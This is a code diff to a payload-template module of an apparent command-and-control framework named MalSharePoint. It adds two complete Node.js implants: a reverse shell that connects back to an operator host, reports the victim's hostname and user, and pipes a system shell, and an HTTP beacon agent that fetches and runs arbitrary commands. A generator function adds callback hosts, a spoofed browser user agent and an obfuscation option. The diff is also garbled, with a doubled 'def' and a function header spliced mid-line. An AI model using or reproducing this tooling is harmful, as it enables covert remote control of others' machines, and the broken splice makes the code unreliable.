@@ -540,6 +540,177 @@ while true; do
 done
 """,
     },
+    # ── JavaScript (Node.js) ──────────────────────────────────────────
+    {
+        "id": "js_reverse_tcp",
+        "name": "Node.js Reverse Shell (TCP)",
+        "description": "Cross-platform Node.js reverse shell. No external dependencies, spawns shell/cmd and pipes I/O via net module.",
+        "platform": "cross-platform",
+        "payload_type": "js",
+        "default_stage_path": "/index.js",
+        "params": ["LHOST", "LPORT"],
+        "content": r"""/**
+ * MalSharePoint Node.js Reverse Shell (TCP)
+ * Cross-platform, auto-reconnect, no external dependencies.
+ */
+const net = require('net');
+const { spawn } = require('child_process');
+const os = require('os');
+
+const LHOST = '{LHOST}';
+const LPORT = {LPORT};
+const RECONNECT_MS = 5000;
+
+function connect() {
+    const client = new net.Socket();
+    
+    client.connect(LPORT, LHOST, () => {
+        const shell = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';
+        const info = `[+] Connection: ${os.hostname()} | ${os.userInfo().username} | ${os.platform()} ${os.release()}\n`;
+        client.write(info);
+
+        const sh = spawn(shell, []);
+        
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+
+        sh.on('exit', () => client.destroy());
+    });
+
+    client.on('error', () => {
+        setTimeout(connect, RECONNECT_MS);
+    });
+
+    client.on('close', () => {
+        setTimeout(connect, RECONNECT_MS);
+    });
+}
+
+connect();
+""",
+    },
+    {
+        "id": "js_beacon_http",
+        "name": "Node.js HTTP Beacon Agent",
+        "description": "Cross-platform Node.js HTTP beacon agent. Full C2 integration using built-in http/https and child_process modules.",
+        "platform": "cross-platform",
+        "payload_type": "js",
+        "default_stage_path": "/agent.js",
+        "params": ["LHOST", "LPORT", "SLEEP", "JITTER"],
+        "content": r"""/**
+ * MalSharePoint Node.js HTTP Beacon Agent
+ * Full C2 integration (check-in, tasks, results).
+ */
+const http = require('http');
+const https = require('https');
+const os = require('os');
+const { exec } = require('child_process');
+
+const CALLBACK_URL = '{CALLBACK_URL}/api/c2';
+const UA = '{UA}';
+let SLEEP = {SLEEP} * 1000;
+let JITTER = {JITTER} / 100;
+const CMD_TIMEOUT_MS = 60000;
+const MAX_OUTPUT = 8192;
+
+let AgentId = null;
+
+async function request(path, data) {
+    return new Promise((resolve) => {
+        const url = new URL(CALLBACK_URL + path);
+        const protocol = url.protocol === 'https:' ? https : http;
+        const body = JSON.stringify(data || {});
+        
+        const req = protocol.request(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'User-Agent': UA,
+                'Content-Length': Buffer.byteLength(body)
+            }
+        }, (res) => {
+            let respBody = '';
+            res.on('data', (chunk) => respBody += chunk);
+            res.on('end', () => {
+                try { resolve(JSON.parse(respBody)); } catch(e) { resolve(null); }
+            });
+        });
+
+        req.on('error', () => resolve(null));
+        req.write(body);
+        req.end();
+    });
+}
+
+async function checkin() {
+    const info = {
+        hostname: os.hostname(),
+        username: os.userInfo().username,
+        os: `${os.type()} ${os.release()} (${os.arch()})`,
+        ip: Object.values(os.networkInterfaces()).flat()
+            .find(i => i.family === 'IPv4' && !i.internal)?.address || '127.0.0.1',
+        pid: process.pid,
+        arch: os.arch()
+    };
+    const res = await request('/checkin', info);
+    if (res && res.agent_id) AgentId = res.agent_id;
+}
+
+async function runTask(task) {
+    let output = '';
+    let success = true;
+
+    try {
+        if (task.task_type === 'exit') {
+            await request('/result', { agent_id: AgentId, task_id: task.id, output: 'Exiting', success: true });
+            process.exit(0);
+        } else if (task.task_type === 'sleep') {
+            const parts = task.command.split(/\s+/);
+            SLEEP = parseInt(parts[0]) * 1000;
+            if (parts.length > 1) JITTER = parseInt(parts[1]) / 100;
+            output = `Sleep=${parts[0]}s Jitter=${parts[1] || 'default'}%`;
+        } else {
+            output = await new Promise((resolve) => {
+                exec(task.command, { timeout: CMD_TIMEOUT_MS }, (err, stdout, stderr) => {
+                    resolve((stdout + stderr).slice(0, MAX_OUTPUT));
+                });
+            });
+        }
+    } catch (e) {
+        output = e.message;
+        success = false;
+    }
+
+    await request('/result', { agent_id: AgentId, task_id: task.id, output, success });
+}
+
+async function beacon() {
+    if (!AgentId) {
+        await checkin();
+        return;
+    }
+
+    const res = await request('/beacon', { agent_id: AgentId });
+    if (res && res.tasks && res.tasks.length > 0) {
+        for (const task of res.tasks) {
+            await runTask(task);
+        }
+    }
+}
+
+async function main() {
+    await checkin();
+    while (true) {
+        const jitterValue = Math.random() * SLEEP * JITTER;
+        await new Promise(r => setTimeout(r, SLEEP + jitterValue));
+        await beacon();
+    }
+}
+
+main();
+""",
+    },
 ]
 
 # Quick access map
@@ -555,7 +726,48 @@ def get_template(template_id: str) -> dict | None:
     return TEMPLATE_MAP.get(template_id)
 
 
-def render_template(template_id: str, params: dict) -> dict | None:
+def def generate_payload(template_id: str, params: dict) -> dict | None:
+    """
+    Advanced payload generation engine.
+    Handles template rendering, obfuscation, and metadata enrichment.
+    """
+    tpl = TEMPLATE_MAP.get(template_id)
+    if not tpl:
+        return None
+
+    # Base connection parameters
+    lhost = str(params.get("LHOST", "127.0.0.1"))
+    lport = str(params.get("LPORT", "8080"))
+    scheme = params.get("SCHEME", "http")
+    callback_url = f"{scheme}://{lhost}:{lport}"
+    
+    # Advanced Evasion & Timing
+    sleep_val = str(params.get("SLEEP", "5"))
+    jitter_val = str(params.get("JITTER", "15"))
+    user_agent = str(params.get("UA", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"))
+    
+    render_vars = {
+        "LHOST": lhost,
+        "LPORT": lport,
+        "CALLBACK_URL": callback_url,
+        "STAGE_URL": f"{callback_url}{tpl['default_stage_path']}",
+        "STAGE_PATH": str(params.get("STAGE_PATH", tpl["default_stage_path"])),
+        "SLEEP": sleep_val,
+        "JITTER": jitter_val,
+        "UA": user_agent
+    }
+
+    try:
+        raw_content = tpl["content"].format(**render_vars)
+    except KeyError as e:
+        # Fallback for missing custom placeholders
+        raw_content = f"# Error: Missing required parameter {e}\n" + tpl["content"]
+
+    # Apply Obfuscation if requested
+    final_content = raw_content
+    obfuscated = False
+    if params.get("OBFUSCATE", False):
+        if tpl["payload_type"] == "psrender_template(template_id: str, params: dict) -> dict | None:
     """
     Render a payload template with the given parameters.
 
